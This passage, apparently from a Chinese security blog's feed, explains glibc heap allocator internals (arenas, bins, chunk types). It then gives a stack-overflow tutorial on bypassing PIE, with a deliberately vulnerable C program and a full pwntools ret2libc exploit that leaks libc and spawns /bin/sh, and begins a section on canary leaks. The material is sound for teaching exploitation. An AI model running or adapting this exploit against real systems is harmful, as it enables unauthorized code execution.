的关系</h2><p>首先，通过内存分布图理清 <code>malloc_state</code> 与 <code>heap_info</code> 之间的组织关系。</p><blockquote><p>下图是<strong>main arena</strong> 和 <strong>thread arena</strong>（只有一个heap的时候） 的内存分布图：</p></blockquote><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/8.png" alt="single heap"></p><p>关于Main Arena的几个点：</p><ul><li>Main Arena中的malloc_state结构是不在Heap中的，并且是存在于libc.so的data段的</li><li>Main Arena是没有heap_info结构的（因为只有一个Heap）</li><li>malloc_state结构中的top成员是指向malloc_chunk结构和Allocated Chunk中间的</li><li>Top Chunk、Allocated Chunk、Free Chunk其中的任何一个和malloc_chunk结构进行组合才是一个完整的chunk块</li></ul><p>关于Thread Arena（单Heap）的几个点：</p><ul><li>Thread Arena中的malloc_state是分配在Heap中的</li><li>heap_info结构中的ar_ptr成员是指向malloc_state结构中的开头，而malloc_state结构中的top成员是指向malloc_chunk和Allocated Chunk中间的（这个是和Main Arena一样的）</li></ul><blockquote><p>下图是一个 <strong>thread arena</strong> 中含有多个 <strong>heap</strong> 的情况：</p></blockquote><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/9.png" alt="multi-heap"></p><p>由于两个 <strong>heap</strong> 是通过 <code>mmap</code> 从操作系统申请的内存，两者在内存布局上并不相邻而是分属于不同的内存区间，所以为了便于管理，<code>glibc</code> 的 <code>malloc</code> 将第二个 <code>heap_info</code> 结构体的 <code>prev</code> 成员指向了第一个 <code>heap_info</code> 结构体的起始位置（即 <code>ar_ptr</code> 成员），而第一个 <code>heap_info</code> 结构体的 <code>ar_ptr</code> 成员指向了 <code>malloc_state</code>，这样就构成了一个单链表，方便后续管理。</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>用户释放掉的 <strong>chunk</strong> 不会马上归还给系统，<strong>ptmalloc</strong> 会统一管理 <strong>heap</strong> 和 <strong>mmap</strong> 映射区域中的空闲的 <strong>chunk</strong>。当用户再一次请求分配内存时，<strong>ptmalloc</strong> 分配器会试图在空闲的 <strong>chunk</strong> 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。</p><p>在具体的实现中，<strong>ptmalloc</strong> 采用分箱式方法对空闲的 <strong>chunk</strong> 进行管理。首先，它会根据空闲的 <strong>chunk</strong> 的大小以及使用状态将 <strong>chunk</strong> 初步分为 4 类：<strong>fast bins</strong>，<strong>small bins</strong>，<strong>large bins</strong>，<strong>unsorted bin</strong>。每类中仍然有更细的划分，相似大小的<strong>chunk</strong> 会用双向链表链接起来。也就是说，在每类<strong>bin</strong> 的内部仍然会有多个互不相关的链表来保存不同大小的 <strong>chunk</strong>。</p><p>对于 <strong>small bins</strong>，<strong>large bins</strong>，<strong>unsorted bin</strong> 来说，<code>ptmalloc</code> 将它们维护在同一个数组中。这些 <strong>bin</strong> 对应的数据结构在<code>malloc_state</code> 中，如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure><p><strong>bin</strong> 作为一种记录 <strong>free chunk</strong> 的链表数据结构。系统针对不同大小的 <strong>free chunk</strong> ，将 <strong>bin</strong> 分为了 4 类：</p><ul><li>fast bin（总共有10个）</li><li>unsorted bin（只有一个）</li><li>small bin（总共有 62 个）</li><li>large bin（总共有63个）</li></ul><p>同时，在 <code>glibc</code> 中用于记录 <strong>bin</strong> 的数据结构有两种，分别为：</p><ul><li><code>fastbinsY</code>: 这是一个数组，用于记录所有的 <strong>fast bin</strong></li><li><code>bins</code> 数组: 这也是一个数组，用于记录除 <strong>fast bin</strong> 之外的所有 <strong>bin</strong> 。事实上这个数组共有 126 个<strong>bin</strong>，分别是：<ul><li>bin [1] : <strong>unsorted bin</strong></li><li>bin [2~63] : <strong>small bin</strong></li><li>bin [64~126] : <strong>large bin</strong></li></ul></li></ul><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>对于size较小的<strong>chunk</strong>，释放之后单独处理，被放入<strong>fast bin</strong>中。</p><ul><li>32位系统，<strong>fast bin</strong>中的<strong>chunk</strong>大小范围在16字节到64字节；</li><li>64位系统，<strong>fast bin</strong>中的<strong>chunk</strong>大小范围在32字节到128字节。</li></ul><p>下图是32位系统分布图：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/12.png" alt="fast bin"></p><p>下图为64位系统的：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/14.png" alt="img"></p><p>在内存分配和释放过程中，<strong>fast bin</strong> 是所有 <strong>bin</strong> 中操作速度最快的。下面详细介绍 <strong>fast bin</strong> 的一些特性：</p><ol><li><strong>fast bin</strong> 的个数为10个，并且为了速度，<strong>fast bin</strong>永远不会进行合并，里面<strong>chunk</strong>中的P标志位永远为1</li><li>这类<strong>bin</strong>通常申请和释放的堆块都比较小，所以使用单链表结构，LIFO（后进先出）分配策略。</li><li>在<strong>fastbinsY</strong>数组里按照从小到大的顺序排列。</li></ol><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p><strong>unsorted bin</strong> 可以视为空闲 <strong>chunk</strong> 回归其所属 <strong>bin</strong> 之前的缓冲区。</p><p>其在 <code>glibc</code> 中具体的说明如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>从下面的宏我们可以看出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure><p><strong>unsorted bin</strong> 处于我们之前所说的 <strong>bin</strong> 数组下标 1 处。故而 <strong>unsorted bin</strong> 只有一个链表。unsorted bin 中的空闲 <strong>chunk</strong> 处于乱序状态，主要有两个来源</p><ul><li>当一个较大的 <strong>chunk</strong> 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 <strong>fast bin</strong> 的 <strong>chunk</strong>，并且该 <strong>chunk</strong> 不和 <strong>top chunk</strong> 紧邻时，该 <strong>chunk</strong> 会被首先放到 <strong>unsorted bin</strong> 中可以加快分配速度。使用双链表结构，FIFO（先进先出）分配策略。</li></ul><p>以64位为例，<strong>unsorted bin</strong>结构如下（非连续内存，大小无限制）：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/15.png" alt="img"></p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>同一个<strong>small bin</strong>里chunk的大小相同，采用双链表结构，使用频率介于<strong>fast bin</strong>和<strong>large bin</strong>之间。每个链表都有链表头结点，这样可以方便对于链表内部结点的管理。此外，<strong>small bins</strong> 中每个 <strong>bin</strong> 对应的链表采用 FIFO（先进先出） 的规则，所以同一个链表中先被释放的 <strong>chunk</strong> 会先被分配出去。<strong>small bin</strong>在<strong>bins</strong>中居第2到第63位，共62个。<strong>small bins</strong> 中每个 <strong>chunk</strong> 的大小与其所在的 <strong>bin</strong> 的 <strong>index</strong> 的关系为：<code>chunk_size = 2 * SIZE_SZ * index</code>，具体如下</p><table><thead><tr><th align="left">下标</th><th align="left">SIZE_SZ=4（32 位）</th><th align="left">SIZE_SZ=8（64 位）</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">16</td><td align="left">32</td></tr><tr><td align="left">3</td><td align="left">24</td><td align="left">48</td></tr><tr><td align="left">4</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">5</td><td align="left">40</td><td align="left">80</td></tr><tr><td align="left">x</td><td align="left">2*4*x</td><td align="left">2*8*x</td></tr><tr><td align="left">63</td><td align="left">504</td><td align="left">1008</td></tr></tbody></table><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/16.png" alt="img"></p><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><p><strong>large bins</strong> 中一共包括 63 个 <strong>bin</strong>，每个 <strong>bin</strong> 中的 <strong>chunk</strong> 的大小不一致，而是处于一定区间范围内。此外，这 63 个 <strong>bin</strong> 被分成了 6 组，每组 <strong>bin</strong> 中的 <strong>chunk</strong> 大小之间的公差一致，具体如下：</p><table><thead><tr><th align="left">组</th><th align="left">数量</th><th align="left">公差</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">不限制</td></tr></tbody></table><p>这里我们以 32 位平台的 <strong>large bin</strong> 为例，第一个 <strong>large bin</strong> 的起始 <strong>chunk</strong> 大小为 512 字节，第二个<strong>large bin</strong>的<strong>chunk</strong>最小为512+64字节（处于<code>[512,512+64)</code>之间的<strong>chunk</strong>都属于第一个<strong>large bin</strong>），以此类推，直到第一组结束。64位平台也是一样的，第一个<strong>large bin</strong>的<strong>chunk</strong>最小为1024字节，第二个<strong>large bin</strong>的<strong>chunk</strong>最小为1024+64字节（处于<code>[1024,1024+64)</code>之间的<strong>chunk</strong>都属于第一个large bin）</p><p>下面附上各类上述三类 <strong>bin</strong> 的逻辑：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/13.jpg" alt="img"></p><h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>在 <code>glibc</code> 的 <code>malloc</code> 中将整个堆内存空间分成了连续的、大小不一的 <strong>chunk</strong>，即对于堆内存管理而言 <strong>chunk</strong> 就是最小操作单位。<strong>chunk</strong> 总共分为4类：</p><ul><li>allocated chunk</li><li>free chunk</li><li>top chunk</li><li>last remainder chunk</li></ul><p>所有类型的 <strong>chunk</strong> 都是内存中一块连续的区域，只是通过该区域中特定位置的某些标识符加以区分。</p><h3 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h3><p>顾名思义就是已经被分配使用的 <strong>chunk</strong> ，区域内容表示如下：</p><ul><li><code>prev_size</code>: <ul><li>如果前一个 <strong>chunk</strong> 是 <strong>free chunk</strong>，则这个内容保存的是前一个 <strong>chunk</strong> 的大小。并且这个字段是归属于当前的chunk的</li><li>如果前一个 <strong>chunk</strong> 是 <strong>allocated chunk</strong>，则这个区域保存的是前一个 <strong>chunk</strong> 的用户数据（也有可能为填充值）。并且这个字段就不属于当前的chunk了</li></ul></li><li><code>size</code>: 保存的是当前这个chunk的大小。总共是 32 位，并且最后的 3 位作为标志位：<ul><li><code>PREV_INUSE (P)</code>: 表示前一个 <strong>chunk</strong> 是否为 <strong>allocated chunk</strong>，而当前是不是 <strong>chunk allocated</strong> 可以通过查询下一个 <strong>chunk</strong> 的这个标志位来得知）</li><li><code>IS_MMAPPED (M)</code>: 表示当前 <strong>chunk</strong> 是否是通过 <code>mmap</code> 系统调用产生的，子线程是 <code>mmap</code>，主线程则是通过 <code>brk</code>。</li><li><code>NON_MAIN_arena (N)</code>: 表示当前 <strong>chunk</strong> 是否属于 <strong>main arena</strong>，也就是主线程的 <strong>arena</strong>。（主线程和子线程的堆区不一样，前文已经做了详细说明）。</li></ul></li></ul><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/10.png" alt="allocated chunk"></p><p>几个注意点：</p><ol><li>每个 <strong>chunk</strong> 的大小怎么确定？<br>用户程序调用 <code>malloc(size_t size)</code> 就会创建一个<strong>chunk</strong>，传入的大小就是当前分配的 <strong>chunk</strong> 大小，这个是非常重要的。</li><li>我们为什么要知道前一个 <strong>chunk</strong> 的信息？<br>为了方便合并不同的 <strong>chunk</strong> ，减少内存的碎片化。如果不这么做， <strong>chunk</strong> 的合并只能向下合并，必须从头遍历整个堆，然后加以合并，这就意味着每次进行 <strong>chunk</strong> 释放操作消耗的时间与堆的大小成线性关系。</li><li><strong>chunk</strong> 的链表是如何构成的？<br><strong>chunk</strong> 在堆内存上是连续的，并不是直接由指针构成的链表，而是通过 <code>prev_size</code> 和 <code>size</code> 块构成了隐式的链表。在进行分配操作的时候，堆内存管理器可以通过遍历整个堆内存的 <strong>chunk</strong> ，分析每个 <strong>chunk</strong> 的 <code>size</code> 字段，进而找到合适的 <strong>chunk</strong>。</li></ol><h3 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h3><ul><li><code>prev_size</code>: 为了防止碎片化，堆中不存在两个相邻的 <strong>free chunk</strong> （如果存在，则被堆管理器合并了）。因此对于一个 <strong>free chunk</strong> ，这个 <code>prev_size</code> 区域中一定包含的上一个 <strong>chunk</strong> 的部分有效数据或者为了地址对齐所做的填充对齐。</li><li><code>size</code>: 同 <strong>allocated chunk</strong> ，表示当前 <strong>chunk</strong> 的大小，其标志位<code>N</code>，<code>M</code>，<code>P</code> 也同 <strong>allocated chunk</strong> 一样。</li><li><code>fd</code>: 前向指针——指向当前 <strong>chunk</strong> 在同一个 <strong>bin</strong>（一种用于加快内存分配和释放效率的显示链表）的下一个（线性中的前一个） <strong>chunk</strong></li><li><code>bk</code>: 后向指针——指向当前 <strong>chunk</strong> 在同一个 <strong>bin</strong> 的上一个（线性中的后一个） <strong>chunk</strong></li></ul><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/11.png" alt="free chunk"></p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>当一个 <strong>chunk</strong> 处于一个<strong>arena</strong>的最顶部（即最高内存地址处）的时候，就称之为 <strong>top chunk</strong>。该 <strong>chunk</strong> 并不属于任何 <strong>bin</strong> ，而是在当前的 <strong>heap</strong> 所有的 <strong>free chunk</strong> （无论那种 <strong>bin</strong>）都无法满足用户请求的内存大小的时候，将此 <strong>chunk</strong> 当做一个应急消防员，分配给用户使用。如果 <strong>top chunk</strong> 的大小比用户请求的大小要大的话，就将该 <strong>top chunk</strong> 分作两部分：用户请求的 <strong>chunk</strong> 和剩余的部分（成为新的 <strong>top chunk</strong>）。否则，就需要扩展 <strong>heap</strong> 或分配新的 <strong>heap</strong> 了，在 <strong>main arena</strong> 中通过 <code>sbrk</code> 扩展 <strong>heap</strong>，而在<strong>thread arena</strong> 中通过 <code>mmap</code> 分配新的 <strong>heap</strong>。注意，至此我们已经多次强调，主线程和子线程的堆管理方式的差异。</p><h3 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h3><p>它是如何产生的：当用户请求的是一个 <strong>small chunk</strong>，且该请求无法被 <strong>small bin</strong>、<strong>unsorted bin</strong> 满足的时候，就通过 <code>binmaps</code> 遍历 <strong>bin</strong> 查找最合适的 <strong>chunk</strong> ，如果该 <strong>chunk</strong> 有剩余部分的话，就将该剩余部分变成一个新的 <strong>chunk</strong> 加入到 <strong>unsorted bin</strong> 中，另外，再将该新的 <strong>chunk</strong> 变成新的 <strong>last remainder chunk</strong> 。</p><p>它的作用是：此类型的 <strong>chunk</strong> 用于提高连续 <code>malloc</code>（产生大量 <strong>small chunk</strong>）的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个 <strong>small chunk</strong> ，且该请求无法被 <strong>small bin</strong> 满足，那么就转而交由 <strong>unsorted bin</strong> 处理。同时，假设当前 <strong>unsorted bin</strong> 中只有一个 <strong>chunk</strong> 的话，也就是 <strong>last remainder chunk</strong> ，那么就将该 <strong>chunk</strong> 分成两部分：前者分配给用户，剩下的部分放到 <strong>unsorted bin</strong> 中，并成为新的 <strong>last remainder chunk</strong> 。这样就保证了连续 <code>malloc</code> 产生的各个 <strong>small chunk</strong> 在内存分布中是相邻的，即提高了内存分配的局部性。</p><h2 id="Glibc内存管理流程图"><a href="#Glibc内存管理流程图" class="headerlink" title="Glibc内存管理流程图"></a>Glibc内存管理流程图</h2><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HeapOverflow/17.png" alt="img"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;introspelliam.github.io&#x2F;2017&#x2F;09&#x2F;10&#x2F;Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;murphypei.github.io&#x2F;blog&#x2F;2019&#x2F;01&#x2F;linux-heap</span><br><span class="line">https:&#x2F;&#x2F;sploitfun.wordpress.com&#x2F;2015&#x2F;02&#x2F;10&#x2F;understanding-glibc-malloc&#x2F;comment-page-1&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;abcdxyzk.github.io&#x2F;blog&#x2F;2015&#x2F;08&#x2F;05&#x2F;kernel-mm-malloc&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;unr4v31&#x2F;p&#x2F;14446412.html</span><br><span class="line">https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;glibc-heap&#x2F;heap_structure&#x2F;#fast-bin</span><br><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1N441147K2?p&#x3D;18</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux栈溢出总结（0x03）</title>
    <link href="https://www.ascotbe.com/2021/03/26/StackOverflow_Linux_0x03/"/>
    <id>https://www.ascotbe.com/2021/03/26/StackOverflow_Linux_0x03/</id>
    <published>2021-03-26T10:45:42.000Z</published>
    <updated>2021-05-17T02:10:15.663Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>上篇文章真的就是一改就花了一个月时间，然后发现篇幅有点太长了分割一下，感觉这篇也需要好久</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/27.png" alt="image-20210326103216832" style="zoom:50%;" /><blockquote><p>记录</p></blockquote><p>几个未填坑的点</p><ul><li>如何计算出TLS的offset大小（EXP抄的，我也懵</li><li>SSP题目中，为什么当可执行文件足够小的时候，他的不同区段可能会被多次映射？</li></ul><blockquote><h2 id="绕过PIE保护"><a href="#绕过PIE保护" class="headerlink" title="绕过PIE保护"></a>绕过PIE保护</h2></blockquote><p>测试代码（题目泄露地址）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;main);</span><br><span class="line">vuln_func();</span><br><span class="line">write(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译产生修改为<code>-pie -fpie</code>，与<code>-pie -fno-pie</code>不同的是，它不再对程序原始字节码做修改，而是使用了一类  <strong>__x86.get_pc.thunk</strong>函数，通过PC指针来做定位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z noexecstack -pie -fpie test.c -o test2.out</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/28.png" alt="image-20210326152720436"></p><p>可以看到call函数的地址变成了上述我们所说的，由于<strong>__x86.get_pc.thunk</strong>的作用将下一条指令的地址赋值给EBX寄存器，然后通过加上一个偏移得到当前进程的GOT表的地址，并以此作为后续的基地址。</p><div class="note info modern"><p>PIE技术的缺陷：我们知道，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。</p></div><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/29.png" alt="image-20210326153042242"></p><p>知道了这些我们就可以编写EXP了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test2.out&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test2.out&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>)<span class="comment">#获取printf输出的main函数地址</span></span><br><span class="line">start_addr = main_addr - elf.sym[<span class="string">&#x27;main&#x27;</span>]<span class="comment">#计算相对偏移</span></span><br><span class="line">vuln_func_addr = start_addr + elf.sym[<span class="string">&#x27;vuln_func&#x27;</span>]</span><br><span class="line">write_plt = start_addr + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = start_addr + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write plt: &quot;</span> + <span class="built_in">hex</span>(write_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write got: &quot;</span> + <span class="built_in">hex</span>(write_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]main addr: &quot;</span> + <span class="built_in">hex</span>(main_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]start addr: &quot;</span> + <span class="built_in">hex</span>(start_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]vuln func addr: &quot;</span> + <span class="built_in">hex</span>(vuln_func_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line">ebx = start_addr + <span class="number">0x2000</span><span class="comment"># 通过相对偏移加上PIE缺陷所得的地址获取到GOT表的地址</span></span><br><span class="line"><span class="comment">#这边的0X2000的值请看《ctf竞赛权威指南（PWN篇）》这本书的PIE解释</span></span><br><span class="line"><span class="comment">#0x699+0x1967=0x2000，为什么这样加呢？请看上面的PIE技术的缺陷，以及上面那张截图圈起来的两个值</span></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span>*<span class="number">132</span>).encode() + p32(ebx) + <span class="string">b&quot;AAAA&quot;</span> + p32(write_plt) + p32(vuln_func_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)<span class="comment">#根据__x86.get_pc.thunk的特性拼接地址，该特性多了一步call操作</span></span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv())</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak write addr: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr=write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr+ libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">&quot;B&quot;</span> * <span class="number">140</span>).encode() + p32(system_addr) + p32(vuln_func_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/30.png" alt="image-20210326163537561"></p><blockquote><h2 id="绕过CANNARY保护"><a href="#绕过CANNARY保护" class="headerlink" title="绕过CANNARY保护"></a>绕过CANNARY保护</h2></blockquote><p>保护原理就是在ebp的低地址添加一个随即值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">High           +-----------------+</span><br><span class="line"> |             |      args       |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |             | return address  |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |     ebp &#x3D;&gt;  |       ebp       |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> |    ebp-4 &#x3D;&gt; |   canary value  |</span><br><span class="line"> |             +-----------------+</span><br><span class="line"> V             |     局部变量     |</span><br><span class="line">Low            +-----------------+</span><br></pre></td></tr></table></figure><hr><h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p><h4 id="利用示例"><a href="#利用示例" class="headerlink" 